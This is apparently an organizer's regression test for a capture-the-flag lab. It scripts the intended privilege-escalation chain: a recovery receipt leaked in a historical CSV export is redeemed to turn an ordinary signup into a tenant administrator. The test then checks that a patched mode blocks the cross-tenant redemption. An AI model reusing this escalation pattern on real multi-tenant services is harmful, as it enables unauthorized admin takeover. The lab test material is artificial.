#!/usr/bin/env python3
"""Organizer regression for the playable historical-export → admin chain."""
import importlib.util
import os
import re
import uuid
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

from smoke import Client, require

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("legacy_check", Path(__file__).with_name("verify-legacy.py"))
legacy = importlib.util.module_from_spec(spec)
spec.loader.exec_module(legacy)
NORTH = "4f3e2d1c-0b9a-4876-9d5c-4b3a29180716"


def signup(profiles):
    client = Client()
    suffix = uuid.uuid4().hex
    status, profile = client.request("/api/auth/register", "POST", {
        "name": "Recovery QA", "company": f"Recovery {suffix}",
        "email": f"recovery-{suffix}@example.test", "password": "local-recovery-verification-password"})
    require(status == 201, f"signup failed: {profile}")
    profiles.append(profile)
    return client, profile


def redeem(client, tenant, receipt, number=4101, **extra):
    return client.request("/api/v2/team/recover", "POST", {
        "tenant_uuid": tenant, "legacy_tenant_no": number, "receipt": receipt, **extra})


def run():
    original = os.environ.get("AETHER_IDENTITY_MODE") or next(
        (line.split("=", 1)[1] for line in (ROOT / ".env").read_text().splitlines()
         if line.startswith("AETHER_IDENTITY_MODE=")), "challenge")
    profiles = []
    try:
        legacy.switch("challenge")
        player, profile = signup(profiles)
        tenant, uid = profile["tenant_id"], profile["id"]
        status, _ = player.request("/api/team")
        require(status == 403, "ordinary signup has administrative access")
        _, csv = legacy.report(player, tenant, 4101)
        match = re.search(r"Recovery receipt: ([0-9a-f]{64})", csv)
        require(match is not None and NORTH in csv, "historical handover evidence missing")
        receipt = match.group(1)
        for destination, token, number, expected in (
                (NORTH, receipt, 4101, 403), (tenant, "0" * 64, 4101, 403),
                (tenant, receipt, 4102, 403), (tenant, "bad", 4101, 400)):
            status, _ = redeem(player, destination, token, number)
            require(status == expected, f"recovery input boundary failed: {status}, expected {expected}")
        status, _ = redeem(player, tenant, receipt, role="system_admin")
        require(status == 400, "recovery accepted a caller-supplied role")
        # Both requests race with the same receipt and session. Only one may commit.
        with ThreadPoolExecutor(max_workers=2) as pool:
            results = list(pool.map(lambda _: redeem(player, tenant, receipt)[0], range(2)))
        require(sorted(results) == [204, 409], f"atomic redemption failed: {results}")
        status, me = player.request("/api/me")
        require(status == 200 and me["role"] == "tenant_admin" and me["tenant_id"] == tenant,
                "recovery did not promote only the current workspace membership")
        status, team = player.request("/api/team")
        require(status == 200 and len(team["users"]) == 1 and team["users"][0]["id"] == uid,
                "team access is missing or disclosed foreign users")
        status, _ = player.request("/api/lab/terminal")
        require(status == 403, "workspace recovery granted terminal access")
        _, events = player.request("/api/audit")
        recovered = [event for event in events if event["action"] == "administrator.recovered"]
        require(len(recovered) == 1 and recovered[0]["detail"]["source_tenant_uuid"] == NORTH
                and recovered[0]["detail"]["tenant_uuid"] == tenant,
                "recovery provenance is missing or duplicated")
        require(receipt not in str(recovered), "audit copied the recovery secret")
        legacy.worker.sql(f"UPDATE users SET role='operator' WHERE id='{uid}';")
        status, _ = redeem(player, tenant, receipt)
        require(status == 409, "demoted account reused a consumed receipt")
        _, me = player.request("/api/me")
        require(me["role"] == "operator", "replay restored a demoted role")
        print("PASS: stage 01 → stage 02 from ordinary signup; atomic promotion, audit, replay and terminal boundary.", flush=True)

        legacy.switch("patched")
        outsider, other = signup(profiles)
        status, _ = redeem(outsider, other["tenant_id"], receipt)
        require(status == 403, "patched recovery accepted a known foreign receipt")
        _, me = outsider.request("/api/me")
        require(me["role"] == "operator", "patched denial changed membership")
        # Organizer fixture tests the legitimate migrated-tenant path, not the
        # playable exploit: no privileged role is seeded.
        legacy.worker.sql(f"UPDATE users SET tenant_id='{NORTH}' WHERE id='{other['id']}';")
        status, _ = redeem(outsider, NORTH, receipt)
        require(status == 204, "patched mode rejected canonical recovery or denial consumed receipt")
        _, me = outsider.request("/api/me")
        require(me["role"] == "tenant_admin" and me["tenant_id"] == NORTH,
                "canonical recovery did not take effect")
        print("PASS: patched recovery rejects foreign bindings and preserves canonical administrator recovery.", flush=True)
    finally:
        try:
            for profile in profiles:
                uid, tenant = profile["id"], profile["tenant_id"]
                legacy.worker.sql(f"DELETE FROM audit_events WHERE user_id='{uid}' OR object_id IN (SELECT id::text FROM reports WHERE requested_by='{uid}'); DELETE FROM reports WHERE requested_by='{uid}'; DELETE FROM users WHERE id='{uid}'; DELETE FROM tenants WHERE id='{tenant}';")
        finally:
            legacy.switch(original)


if __name__ == "__main__":
    run()
